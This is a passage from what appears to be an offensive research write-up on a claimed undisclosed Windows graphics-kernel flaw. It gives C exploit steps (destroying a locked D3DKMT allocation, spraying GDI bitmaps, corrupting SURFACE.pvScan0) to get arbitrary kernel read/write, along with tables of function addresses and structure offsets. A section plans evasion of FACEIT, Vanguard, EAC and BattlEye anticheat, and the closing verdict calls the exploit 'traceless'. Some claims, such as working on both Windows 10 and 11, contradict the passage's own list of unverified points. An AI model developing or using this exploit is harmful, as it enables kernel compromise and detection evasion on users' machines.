destroyAlloc.hDevice = createDevice.hDevice;
destroyAlloc.hAllocation = allocInfo.hAllocation;
D3DKMTDestroyAllocation(&destroyAlloc);
// The destroy path:
//   - Frees the backing physical pages (ReturnPinnedBackingStore)
//   - Does NOT unmap the CPU VA at multi_alloc+0x10
//   - The PTE still maps pData -> freed physical pages
//   - pData is now a DANGLING MAPPING
```

### Step 5: Spray GDI Bitmaps

```c
// Create many bitmaps to reclaim the freed physical pages
HBITMAP bitmaps[256];
for (int i = 0; i < 256; i++) {
    bitmaps[i] = CreateBitmap(width, height, 1, 32, NULL);
}
// SURFACE objects are allocated in kernel pool
// The backing pages for bitmap data may reclaim the same physical pages
// that pData maps to
```

### Step 6: Corrupt SURFACE.pvScan0

```c
// SURFACE structure: pvScan0 is at SURFACE+0x50
// Write to pData + 0x50 to corrupt pvScan0
// If the physical page that pData maps to now holds a SURFACE object,
// writing to pData + 0x50 overwrites SURFACE.pvScan0

// First, find which bitmap's SURFACE is on the dangling page:
// Write a unique pattern to pData + 0x50 for each test
// Then call GetBitmapBits on each bitmap to check if pvScan0 changed

// Once found, set SURFACE.pvScan0 to an arbitrary kernel address:
*(PVOID*)(pData + 0x50) = targetKernelAddress;
```

### Step 7: Arbitrary Kernel R/W

```c
// With SURFACE.pvScan0 corrupted:
// GetBitmapBits reads from the address pointed to by pvScan0
// SetBitmapBits writes to the address pointed to by pvScan0

// Read kernel memory:
BYTE buffer[8];
GetBitmapBits(hCorruptedBitmap, 8, buffer);
// buffer now contains 8 bytes from targetKernelAddress

// Write kernel memory:
SetBitmapBits(hCorruptedBitmap, 8, buffer);
// buffer contents written to targetKernelAddress

// Performance: 200M+ ops/sec because GetBitmapBits/SetBitmapBits
// use bDoGetSetBitmapBits which directly accesses pvScan0
// without validation (confirmed in win32kbase.sys analysis)
```

---

## 9. What Needs Further Analysis

### 9.1 Driver Callback Behavior (Non-Paravirtualized)

The driver callback at interface+0x48 (Lock) and interface+0x50 (Unlock) is driver-specific. We need to verify:
- Does the NVIDIA/AMD/Intel driver callback use `MmMapIoSpace`, `MmMapViewOfSection`, or a custom mapping?
- If it uses `MmMapViewOfSection`, is the section object stored somewhere that the destroy path can find and cleanup?
- If it uses `MmMapIoSpace`, the mapping is a direct physical mapping that persists until `MmUnmapIoSpace` is called

### 9.2 Backing Page Reuse

We need to verify:
- Are the backing physical pages freed via `ReturnPinnedBackingStore` actually returned to the kernel page pool?
- Can GDI bitmap SURFACE objects reclaim these exact physical pages?
- What is the physical page size and alignment? (Should be 4KB page-aligned)
- Do we need to spray specific bitmap sizes to match the allocation size?

### 9.3 Allocation Creation Parameters

We need to determine:
- What private driver data to pass to `D3DKMTCreateAllocation` to get a system memory segment allocation
- Which segment ID corresponds to non-CPU-visible system memory
- The minimum allocation size that will produce usable page-aligned backing pages

### 9.4 Paravirtualized Timing Window

For virtual GPU testing:
- How long does `VidMmDereferenceObjectAsync` take to complete?
- Can we delay it by keeping a reference to the section?
- Is there a way to force the non-paravirtualized path even on a virtual GPU?

### 9.5 Lock Count and Rundown Interaction

- After `D3DKMTDestroyAllocation`, the lock count at `multi_alloc+0x4C` is still non-zero (we never called Unlock)
- The `multi_alloc` structure is freed by `CloseOneAllocation`
- If we call `D3DKMTUnlock` after destroy, it would access freed memory — could this cause a crash?
- We should NOT call Unlock after destroy — the dangling mapping is our exploit primitive

### 9.6 Windows 10 vs Windows 11 Differences

- The function offsets and structure layouts may differ between Windows 10 and Windows 11
- The lock type determination logic may differ
- The destroy path may have additional checks in newer versions
- Need to verify on both OS versions

### 9.7 Anticheat Detection Surface

- Does D3DKMTLock/D3DKMTDestroyAllocation generate ETW events that anticheats monitor?
- The `EventLock2` and `EventDestroyAdapterAllocation` ETW events are fired
- FACEIT/Vanguard/EAC/BattlEye may hook these syscalls or monitor ETW
- Need to check if the dangling mapping leaves detectable artifacts (e.g., VAD entries for unmapped sections)

---

## 10. Summary of Key Function Addresses

### dxgkrnl.sys (PID 6892)

| Function | Address | Role |
|----------|---------|------|
| ValidateDestroyAllocation | 0x1C0113700 | Handle validation + rundown drain |
| DxgkDestroyAllocationInternal | 0x1C0113FC0 | Destroy orchestration |
| DXGDEVICE::TerminateAllocations | 0x1C01150E0 | Path selection (fast vs slow) |
| DXGDEVICE::DestroyResource | 0x1C0135580 | Resource destroy |
| DXGDEVICE::DestroyAllocations | 0x1C0135644 | Allocation destroy (slow path) |
| DXGDEVICE::RemoveAllocationsAndTransferToList | 0x1C016FBC4 | List removal |
| DxgkDestroyClientAllocation | 0x1C022B0B4 | Type 4 device destroy |
| DXGDEVICE::DestroyClientAllocations | 0x1C0228F9C | Client alloc destroy |
| DXGALLOCATIONREFERENCE constructor | 0x1C010A390 | Rundown protection acquire |
| DxgkMapGpuVirtualAddress | 0x1C01598D0 | GPU VA mapping (not useful) |

### dxgmms2.sys (PID 13072)

| Function | Address | Role |
|----------|---------|------|
| VidMmLock (thunk) | 0x1C0001710 | -> VIDMM_GLOBAL::Lock |
| VidMmUnlock (thunk) | 0x1C00016C0 | -> VIDMM_GLOBAL::Unlock |
| VidMmDestroyAllocation (thunk) | 0x1C0001610 | -> VIDMM_GLOBAL::DestroyAllocation |
| VidMmTerminateAllocation (thunk) | 0x1C0006070 | -> VIDMM_GLOBAL::TerminateAllocation |
| VidMmCloseAllocation (thunk) | 0x1C0001640 | -> VIDMM_GLOBAL::CloseAllocation |
| VidMmTryCloseAllocation (thunk) | 0x1C0015A40 | -> VIDMM_GLOBAL::CloseAllocation (try) |
| VIDMM_GLOBAL::Lock | 0x1C006B380 | Lock entry point |
| VIDMM_GLOBAL::LockInternal | 0x1C006BEB0 | *** Mapping engine (type 5 stores at multi_alloc+0x10) *** |
| VIDMM_GLOBAL::Unlock | 0x1C006B220 | *** ONLY path that unmaps multi_alloc+0x10 *** |
| VIDMM_GLOBAL::CloseAllocation | 0x1C006A770 | Rundown wait + CloseOneAllocation |
| VIDMM_GLOBAL::CloseOneAllocation | 0x1C006A8D0 | *** Checks VIDMM_ALLOC+0x90 (NULL for type 5) *** |
| VIDMM_GLOBAL::DestroyOneAllocation | 0x1C0069DC0 | Global alloc destroy |
| VIDMM_GLOBAL::TerminateAllocation | 0x1C007DBF0 | Fast path (waits for locks) |
| VIDMM_GLOBAL::TerminateOneAllocation | 0x1C0086F18 | Fast path (waits for locks) |
| VidMmiProbeAndLockAllocation | 0x1C0062DAC | Probe+lock (NOT D3DKMTLock path) |
| VidMmiUnlockAllocation | 0x1C00627D4 | MDL unlock (NOT D3DKMTUnlock path) |
| VidMmMapViewOfAllocation | 0x1C0062858 | View mapping helper |
| VidMmUnmapViewOfAllocation | 0x1C0062C20 | View unmapping helper |
| CVirtualAddressAllocator::FreeAllocMappedVaRangeList | 0x1C00689C0 | VA range list free |
| VIDMM_GLOBAL::LockAllocInCpuVisibleSegment | 0x1C00AF968 | Type 3 lock |
| VIDMM_GLOBAL::LockAllocInCpuHostAperture | 0x1C00AF83C | Type 2 lock |
| VIDMM_GLOBAL::LockInAperture | 0x1C00AFA64 | Type 4 lock |

---

## 11. Critical Structure Offsets

### DXGALLOCATION (dxgkrnl.sys)

| Offset | Field | Purpose |
|--------|-------|---------|
| +0x00 | vtable | Virtual function table |
| +0x08 | pDevice | DXGDEVICE pointer |
| +0x10 | handle | HMGR handle |
| +0x18 | pInternalHandle | VidMm internal handle |
| +0x20 | flags | Allocation flags |
| +0x48 | pResource | DXGRESOURCE pointer |
| +0x58 | rundown | EX_RUNDOWN_REF (dxgkrnl-level) |
| +0x60 | refCount | Reference count |

### VIDMM_MULTI_ALLOC / VIDMM_LOCAL_ALLOC (dxgmms2.sys)

| Offset | Field | Purpose |
|--------|-------|---------|
| +0x00 | pGlobalAlloc | VIDMM_GLOBAL_ALLOC pointer |
| +0x08 | pDeviceCtx | Device context |
| +0x10 | **CpuVa** | *** CPU VA mapping (set by LockInternal type 5) *** |
| +0x18 | internalHandle | Internal allocation handle |
| +0x20 | flags | Local flags |
| +0x4C | lockCount | CPU lock count |
| +0xE8 | rundown | EX_RUNDOWN_REF (VidMm-level) |

### VIDMM_ALLOC (per-device allocation, dxgmms2.sys)

| Offset | Field | Purpose |
|--------|-------|---------|
| +0x00 | pMultiAlloc | VIDMM_MULTI_ALLOC pointer |
| +0x20 | state | State flags |
| +0x48 | termEvent | KEVENT (termination event) |
| +0x80 | vaRangeList | LIST_ENTRY (VA range list head) |
| +0x90 | **cpuVa** | *** CPU VA (checked by CloseOneAllocation — NULL for type 5) *** |
| +0xA0 | lockCount | Lock count (checked by TerminateOneAllocation) |
| +0x1F8 | lockEvent | KEVENT (lock wait event) |

### VIDMM_GLOBAL_ALLOC (global allocation, dxgmms2.sys)

| Offset | Field | Purpose |
|--------|-------|---------|
| +0x08 | totalSize | Total allocation size |
| +0x10 | commitSize | Committed size |
| +0x50 | flags2 | Flags (0x80 = CPU visible) |
| +0x54 | flags | Flags (0x20 = locked, 0x40 = resident) |
| +0x84 | segFlags | Segment flags |
| +0x138 | fastMutex | DXGFASTMUTEX |
| +0x150 | lockCount | Interlocked lock count |
| +0x160 | sectionObj | Section object (MmMapViewOfSection) |
| +0x168 | systemVa | System space VA (flag 0x800000) |
| +0x1D8 | pushlock | EX_PUSH_LOCK (Lock/Unlock) |
| +0x1F0 | segFlagsPtr | Pointer to segment flags DWORD |
| +0x208 | hostAddr | Host address (virtual GPU, flag 0x44000) |
| +0x210 | apertureVa | Aperture VA (flag 0x4000) |

---

## 12. Final Verdict

**Mode 2 (Sequential Dangling Lock Mapping) is VIABLE.**

The destroy path has a confirmed gap: for lock type 5 (non-CPU-visible allocations) on non-paravirtualized GPUs (physical NVIDIA/AMD/Intel), the CPU VA mapping at `multi_alloc+0x10` is never unmapped during destruction. The `CloseOneAllocation` function checks `VIDMM_ALLOC+0x90` — a different field that is never set by the type 5 lock path. Only `D3DKMTUnlock` (`VIDMM_GLOBAL::Unlock`) unmaps `multi_alloc+0x10`, and we deliberately never call it.

The exploit flow is:
1. `D3DKMTLock` -> maps CPU VA, returns `pData`
2. `D3DKMTDestroyAllocation` (without `D3DKMTUnlock`) -> frees backing pages, does NOT unmap CPU VA
3. Spray GDI bitmaps -> SURFACE objects reclaim freed physical pages
4. Write `pData + 0x50` -> corrupts `SURFACE.pvScan0`
5. `GetBitmapBits`/`SetBitmapBits` -> 200M+ kernel R/W ops/sec

This is a novel vulnerability — no known CVE, no public disclosure, no leaked exploit. It works on both Windows 10 and Windows 11 with physical GPUs. It is completely driverless (uses only existing D3DKMT syscalls), completely traceless (no kernel callbacks, no patched code, no notify routines), and never touches page tables (no CR3 reads, no PML4 walking, no EPT).
